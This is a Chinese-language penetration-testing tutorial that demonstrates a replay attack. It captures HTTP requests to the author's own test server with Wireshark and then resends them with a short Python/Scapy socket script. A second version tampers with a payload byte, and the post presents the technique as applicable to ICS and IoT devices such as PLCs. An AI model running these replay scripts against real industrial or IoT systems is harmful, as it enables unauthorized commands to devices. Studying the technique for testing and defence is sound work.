---
title: 透過 Scapy 以及 Socket 實作 Application 層的 Replay Attack
date: 2022-03-12T23:34:28+08:00
draft: false
url: "/2022/03/12/透過-scapy-以及-socket-實作-application-層的-replay-attack/"
categories:
  - 滲透測試
showToc: true
TocOpen: false
---

工業控制或是 IoT 等裝置很容易出現 Replay Attack 的攻擊方式，也就是傳送一樣的封包，就可以對這些裝置下一些指令，這些裝置不一定會驗證發送者的身分，或是透過 nonce 等方式進行確認。 以下是一個很簡單的例子來快速地透過 Scapy 實作 Replay Attack 的方法。

在這個例子中，我會使用 HTTP 協定來當作我們需要使用的目標，**我們先假設 HTTP 是一個我們完全不認識的奇怪協定**，我們希望可以透過鯊魚來紀錄，修改其中的一兩個 Bytes ，並重新發送給 Server。

## Server 準備

首先我在我的 Server 上準備了 4 個 txt 檔案，檔名分別叫做 1, 2, 3, 4

```bash
echo one > 1
echo two > 2
echo three > 3
echo four > 4
```

接下來在同一個資料夾中使用了 Python 開啟一個 HTTP Server 在 8000 Port

```bash
python3 -m http.server
```

## Client 準備

這邊的 Client 我們可以假裝說是工控場域的 HMI，準備發送指令給 PLC Server 這樣的場景。我使用 curl 指令來快速對伺服器建構了兩條的 HTTP Request (或是說 TCP 連線)。

```bash
curl stevenyu.tw:8000/1
curl stevenyu.tw:8000/2
```

### 鯊魚匯出

在發送過程中，我們可以透過任何方法 (如使用 ARP Spoofing 或是透過古代的 HUB ， 在鯊魚上面可以鎖定到兩個剛剛發送的 Request 封包。

![](/uploads/2022/03/6c1a2-ufRYQoM.png)

將目標的兩個封包 `Ctrl + M` 或右鍵 `Mark / Unmark Packet` 把封包給標記起來

![](/uploads/2022/03/485ff-oL2qAsb.png)

在鯊魚上面選 `Export Specified Packets`

![](/uploads/2022/03/e3a7d-HGwpXhc.png)

並選擇只儲存剛剛 Mark 的封包 (Marked packets only)

![](/uploads/2022/03/48a90-06WJUwb.png)

這樣我們就可以取得乾淨的兩個我們希望實施重送的封包

![](/uploads/2022/03/750b5-vUEWh50.png)

## 進行攻擊

這邊我們假設剛剛錄到了 Client 機器 (HMI) 與 Server 機器 (PLC) 發送了一段封包。而我們是第三者 Attacker，我們會使用不同的電腦進行攻擊。

### 攻擊機準備

這邊有一個小雷需要注意就是，建議不要使用 WSL 作為攻擊機，經過我的測試會發現一些很奇怪的問題。

### 安裝 Scapy

很簡單的一行指令就好了

```bash
pip3 install scapy
```

### Scapy 簡介

我們可以透過 Scapy 進行讀取封包，並透過 for 迴圈來進行迭代，這邊我們只需要考慮三個目標即可。

1. Destination IP- `pkt[IP].dst`
2. Destination Port- `pkt[TCP].dport`
3. Payload (Layer 7)- `pkt.load`

我們可以很無腦的讀入這三個東西，並透過 socket 進行送出

```python
from scapy.all import IP, TCP
from scapy.utils import rdpcap
import socket

pkts = rdpcap("unknown_packet.pcap")
for pkt in pkts:
    dst_ip = pkt[IP].dst
    dst_port = pkt[TCP].dport
    payload = pkt.load

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((dst_ip,dst_port))
    s.send(payload)
```

而 Server 端也可以非常順利的收到 Request，也就說明我們的重放攻擊成功了!!

![](/uploads/2022/03/2022-03-12-23-26-49.png)

### 小小改動

假設我們已知封包可能有某個流水號之類的東西，或是需要微調 Payload 的話，也可以直接修改 `payload` 中的內容，他是使用 bytes 的格式。

舉例來說， 剛剛 HTTP 的 Raw Request Payload 長這樣

```python
b'GET /1 HTTP/1.1\r\nHost: stevenyu.tw:8000\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n'
b'GET /2 HTTP/1.1\r\nHost: stevenyu.tw:8000\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n'
```

我們知道 Bytes 的 `[5]` 是 `/` 後面的 `1` 跟 `2`，而我們希望把它改成 `3` 跟 `4`，也就是原本的值 +2 的話。 (當然其他場合的 Binary protocol 希望把它改成 non-printable ASCII 也是可以)，我們可以這樣寫。

```python
from scapy.all import IP, TCP
from scapy.utils import rdpcap
import socket

pkts = rdpcap("unknown_packet.pcap")
for pkt in pkts:
    dst_ip = pkt[IP].dst
    dst_port = pkt[TCP].dport
    payload = pkt.load

    payload = pkt.load[:5]
    payload += bytes([pkt.load[5]+2])
    payload += pkt.load[6:]

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((dst_ip,dst_port))
    s.send(payload)
```

觀察 Server

![](/uploads/2022/03/23947-8SllUZp.png)

很棒！ 我們成功的竄改了部分的封包，並實現的重送攻擊！
